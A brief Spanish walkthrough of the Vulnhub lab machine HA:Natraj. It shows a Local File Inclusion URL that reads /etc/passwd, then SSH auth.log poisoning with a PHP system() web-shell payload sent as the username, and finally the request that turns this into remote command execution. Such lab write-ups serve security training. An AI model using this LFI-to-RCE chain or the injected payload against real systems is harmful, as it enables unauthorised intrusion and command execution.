# Maquina HA:Natraj Vulnhub

Puerto Abiertos 22, 80
```
- 22 --> SSH
- 80 --> HTTP
```
Encontramos que tenemos un Local File Inclusion

'http://IP_VIctima/console/file.php?file=/etc/passwd' 

Probando Rutas atraves del LFI vemos que tenemos acceso a la siguiente ruta:
```
/var/log/auth.log --> que pertenece a los logs de Registro de SSH
```
Apuntamos al recurso y probamos a inyectar en el campo username por SSH 

Procedemos a conectarnos por SSH:
```
ssh '<?php system($_GET['cmd']); ?>'@IP_Victima 
No proporcionamos contraseña ninguna.. .. .. 
```
Con este comando procedemos a envenenar el log auth.log de SSH para proceder a realizar una peticion por BURPSUITE o con curl y ejecutar comandos atraves del parametro 
CMD que hemos metido en codigo PHP en el AUTH.log

'http://IP_VIctima/console/file.php?file=/var/log/auth.log&cmd=id'

Chequeando atraves del LFI veriamos que ya tenemos un RCE o Ejecucion Remota de Comandos.
